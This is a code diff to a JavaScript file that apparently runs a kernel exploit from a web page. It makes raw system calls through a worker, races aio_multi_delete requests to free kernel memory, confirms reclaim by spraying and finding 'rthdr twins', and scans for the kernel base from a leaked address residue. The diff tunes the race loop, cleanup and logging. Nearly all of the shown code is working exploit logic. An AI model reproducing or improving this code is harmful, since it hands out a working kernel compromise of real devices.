@@ -7,7 +7,10 @@ const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
 const lines = [];
 
+const VERBOSE = new URLSearchParams(location.search).get("verbose") === "1";
+
 function post(tag, detail) {
+    if (!VERBOSE) return;
     try {
         const x = new XMLHttpRequest();
         x.open("POST", "t", true);
@@ -16,8 +19,6 @@ function post(tag, detail) {
              + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
     } catch (e) { }
 }
-
-const VERBOSE = new URLSearchParams(location.search).get("verbose") === "1";
 
 const PROSE = [
     / -- /, /\.\s/, /,\s+(which|so|and that|because|since|as that)\s/,
@@ -39,18 +40,14 @@ function terse(s) {
 }
 function mark(tag, detail) {
     detail = terse(detail);
-    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
-    const esc = function (t) {
-        return String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;")
-                        .replace(/>/g, "&gt;");
-    };
-    outEl.innerHTML = lines.map(function (l) {
-        l = esc(l);
-        const c = /FAIL|ERROR|THREW|MISMATCH|WRONG|MISSING|TIMEOUT|NOT-FOUND/i.test(l) ? "bad"
-                : /SKIP|GAP|WOULD-HAVE-WON|WARN/i.test(l) ? "warn"
-                : /OK|PROVEN|READY|pass|BASELINE/i.test(l) ? "ok" : "";
-        return c ? '<span class="' + c + '">' + l + "</span>" : l;
-    }).join("\n");
+    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
+    lines.push(line);
+    const span = document.createElement("span");
+    span.className = /FAIL|ERROR|THREW|MISMATCH|WRONG|MISSING|TIMEOUT|NOT-FOUND/i.test(line) ? "bad"
+        : /SKIP|GAP|WOULD-HAVE-WON|WARN/i.test(line) ? "warn"
+        : /OK|PROVEN|READY|pass|BASELINE/i.test(line) ? "ok" : "";
+    span.textContent = line + "\n";
+    outEl.appendChild(span);
     outEl.scrollTop = outEl.scrollHeight;
     post(tag, detail);
 }
@@ -1031,7 +1028,7 @@ function makeRpc(worker) {
         let won = false, confirmed = false, twins = null;
         let attemptsUsed = 0, detectorFired = 0;
 
-        let winAt = -1, sprayedAt = -1, heartbeat = 0, setupFail = null;
+        let winAt = -1, sprayedAt = -1, setupFail = null;
 
         let realFrees = 0, benignHits = 0, reclaimFailed = false, misfireCap = false;
 
@@ -1048,16 +1045,8 @@ function makeRpc(worker) {
         const phaseAtDecision = [0, 0];
         let lastPollErr = 0, lastTcp = 0, raceErr0 = 0, raceErr1 = 0;
         const tRace = Date.now();
-        heartbeat = setInterval(function () {
-            post("RACE-PROGRESS", "attempt=" + attemptsUsed
-                + " detector_fired=" + detectorFired + " real_frees=" + realFrees
-                + " early=" + tooEarlySeen + " window=" + inWindowSeen
-                + " late=" + tooLateSeen
-                + " freed_at=" + winAt + " sprayed_at=" + sprayedAt
-                + " committed=" + committed);
-        }, 250);
 
-        for (let it = 0; it < ATTEMPTS && !confirmed; ++it) {
+        for (let it = 0; it < ATTEMPTS && !confirmed && !committed; ++it) {
             attemptsUsed = it + 1;
             const client = sc(SYS.socket, AF_INET, SOCK_STREAM, 0).i32;
             optval.dv.setInt32(0, CLIENT_SNDBUF, true);
@@ -1203,36 +1192,27 @@ function makeRpc(worker) {
 
             await raceTask;
 
-            if (won) {
+            if (committed) {
                 raceErr0 = outs.dv.getUint32(0, true);
                 raceErr1 = outs.dv.getUint32(4, true);
-                if (raceErr0 === 0 && raceErr1 === 0) {
-
-                    realFrees++;
-                    sprayedAt = it;
-
-                    twins = findRthdrTwins(0x80, true);
-                    confirmed = !!twins;
-                    rebootRequired = true;
-                    if (!confirmed) {
-
-                        reclaimFailed = true;
-                        break;
-                    }
-                } else {
-
-                    benignHits++;
-                    committed = realFrees > 0;
-                    if (benignHits >= MAX_MISFIRES) { misfireCap = true; break; }
+                sprayedAt = it;
+                rebootRequired = true;
+                twins = findRthdrTwins(0x80, true);
+                confirmed = !!twins;
+                if (confirmed) realFrees++;
+                else reclaimFailed = true;
+                for (let i = 0; i < NUM_REQS; ++i) {
+                    if (i === WHICH) continue;
+                    sc(SYS.aio_multi_delete, aioIds.addr.add32(i * 4), 1, outs.addr);
                 }
-                won = confirmed;
+                sc(SYS.close, conn);
+                break;
             }
 
             sc(SYS.aio_multi_delete, aioIds.addr, NUM_REQS, outs.addr);
             sc(SYS.close, conn);
         }
         const raceMs = Date.now() - tRace;
-        if (heartbeat) { clearInterval(heartbeat); heartbeat = 0; }
 
         if (setupFail) mark("SOCKET-SETUP-FAILED", setupFail);
         mark("RACE-DONE", attemptsUsed + " attempts in " + raceMs + " ms, "
@@ -2082,11 +2062,11 @@ function makeRpc(worker) {
                 mark("KSTR-PLAN", "residue=0x" + KSTR_RESIDUE.toString(16)
                     + " window=0x" + KSTR_LO.toString(16) + "..0x"
                     + KSTR_HI.toString(16) + " step=0x4000 order=ascending");
-                if (KSTR_RESIDUE !== 0x26f)
-                    mark("KSTR-RESIDUE-ODD", "expected 0x26f from the earlier "
-                        + "runs but this one gives 0x" + KSTR_RESIDUE.toString(16)
-                        + " -- the constraint may not hold, treat the result "
-                        + "with suspicion");
+                if (KSTR_RESIDUE !== (off.k_evf_cv & 0x3fff))
+                    mark("KSTR-RESIDUE-ODD", "table k_evf_cv residue is 0x"
+                        + (off.k_evf_cv & 0x3fff).toString(16)
+                        + " but leaked 0x" + KSTR_RESIDUE.toString(16)
+                        + " -- treat the kernel-base scan with suspicion");
 
                 let first = KSTR_LO;
                 while ((first & 0x3fff) !== KSTR_RESIDUE) first++;
